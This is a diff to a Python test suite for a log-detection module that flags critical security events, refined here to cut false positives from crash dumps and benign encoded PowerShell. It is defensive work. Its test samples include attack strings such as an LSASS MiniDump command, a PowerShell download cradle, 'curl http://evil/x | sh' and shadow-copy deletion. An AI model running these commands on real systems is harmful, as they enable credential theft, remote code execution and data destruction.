@@ -157,8 +157,8 @@ def test_all_six_criteria_are_reachable():
         "C1": "comsvcs.dll MiniDump",
         "C2": "wmic /node:10.0.0.5 process call create",
         "C3": "EID=1102 audit log was cleared",
-        "C4": r"C:\Users\Public\payload.exe",
-        "C5": "powershell -enc SQBFAFgA",
+        "C4": r"schtasks /create /tn Updater /tr C:\Users\Public\payload.exe",
+        "C5": "powershell -EncodedCommand x DownloadString('http://h/a')",
         "C6": "vssadmin delete shadows /all",
     }
     for tag, sample in samples.items():
@@ -254,7 +254,8 @@ def test_json_escaping_does_not_hide_a_path():
 
 def test_forward_slashes_are_folded():
     """The same path is written both ways depending on the producer."""
-    assert criteria.supported_by("C4", "C:/Users/Public/payload.exe")
+    assert criteria.supported_by(
+        "C4", "schtasks /create /tr C:/Users/Public/payload.exe")
 
 
 def test_critical_with_no_basis_at_all_is_downgraded():
@@ -306,11 +307,33 @@ def test_a_run_key_into_appdata_is_not_forced_to_critical():
         "C4", r"TargetObject=HKLM\...\Run\Updater Details=C:\Users\jdoe\AppData\Roaming\updater.exe")
 
 
-def test_the_writable_paths_that_remain_still_match():
+def test_a_writable_path_needs_a_mechanism_beside_it():
+    """A path is a location. Persistence is something that will run again, and
+    this criterion used to accept the first as evidence of the second.
+
+    Windows Error Reporting writes its crash dumps under
+    `C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\`, which matched both
+    `programdata` and `\\temp\\`. Three of the ten real events in the corpus
+    were being forced to CRITICAL by a desktop reporting that something had
+    crashed - and a forced criterion bypasses the confidence gate, so each one
+    went to an analyst.
+    """
     for path in (r"C:\Users\Public\svchost.exe",
                  r"C:\Windows\Temp\payload.exe",
                  r"C:\ProgramData\x.exe"):
-        assert criteria.supported_by("C4", path), path
+        assert not criteria.supported_by("C4", path), path
+
+    for mechanism in (r"schtasks /create /tr C:\Users\Public\svchost.exe",
+                      r"HKLM\Software\...\CurrentVersion\Run\x = C:\Windows\Temp\p.exe",
+                      r"A service was installed ImagePath=C:\Users\Public\s.exe"):
+        assert criteria.supported_by("C4", mechanism), mechanism
+
+
+def test_a_crash_dump_is_not_persistence():
+    """The observed event that made the point, kept close to verbatim."""
+    wer = (r"[Windows Error Reporting] EID=1001 | LiveKernelEvent | "
+           r"\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WER.cf3a2b91.tmp.xml")
+    assert not criteria.supported_by("C4", wer)
 
 
 def test_the_model_cannot_manufacture_its_own_evidence():
@@ -334,3 +357,59 @@ def test_a_real_marker_in_the_log_still_matches_without_observed():
     verdict = v(observed="", claimed="none", verdict="NOT_CRITICAL")
     criteria.apply(verdict, "CommandLine=rundll32 comsvcs.dll, MiniDump 704 x.dmp")
     assert verdict.verdict == "CRITICAL"
+
+
+# --------------------------------------------------------------------------
+# Reading the payload rather than the wrapper
+# --------------------------------------------------------------------------
+
+def _enc(script: str) -> str:
+    """A PowerShell -EncodedCommand, encoded the way PowerShell encodes it."""
+    import base64
+    return "powershell.exe -nop -w hidden -enc " + base64.b64encode(
+        script.encode("utf-16-le")).decode()
+
+
+def test_encoding_alone_is_not_the_indicator():
+    """This estate's own management tooling ran an encoded command on an
+    ordinary afternoon, and the criterion forced it to CRITICAL - which then
+    bypasses the confidence gate and reaches an analyst.
+
+    A developer decoding a config string is the same shape. Both are in the
+    corpus, and the flag cannot tell them apart because the flag is not what
+    differs.
+    """
+    assert not criteria.supported_by("C5", _enc("Get-Date; Write-Host hello"))
+    assert not criteria.supported_by(
+        "C5", "[Convert]::FromBase64String($env:APP_CONFIG)")
+
+
+def test_a_cradle_inside_the_payload_is_found():
+    """What actually separates the two: one of them fetches and runs remote
+    code. That is only visible after decoding, which is the entire reason
+    -EncodedCommand is used."""
+    assert criteria.supported_by(
+        "C5", _enc("IEX (New-Object Net.WebClient).DownloadString('http://h/a.ps1')"))
+
+
+def test_the_decoder_ignores_things_that_merely_look_like_base64():
+    """GUIDs, hashes and hex dumps fill these logs. Decoding them yields
+    mojibake, and mojibake in the haystack can coincide with a marker."""
+    noise = ("22feb12c-e7ce-4ccb-8f8b-f10fa2f43e90 ffffe68b1db70370 "
+             "fffff8053b00b6a0 " + "a1b2c3d4" * 12)
+    decoded = criteria.decoded_payload(noise)
+    assert "downloadstring" not in decoded.lower()
+
+
+def test_the_decoder_is_bounded():
+    """A log line can be very long and this runs on every event."""
+    import base64
+    blob = base64.b64encode(b"DownloadString http://x " * 4).decode()
+    assert criteria.decoded_payload(" ".join([blob] * 200))
+
+
+def test_utf8_payloads_decode_too():
+    """PowerShell is UTF-16LE; everything on Linux is not."""
+    import base64
+    blob = base64.b64encode(b"curl http://evil/x | sh").decode() + "AAAA"
+    assert "curl" in criteria.decoded_payload(blob)
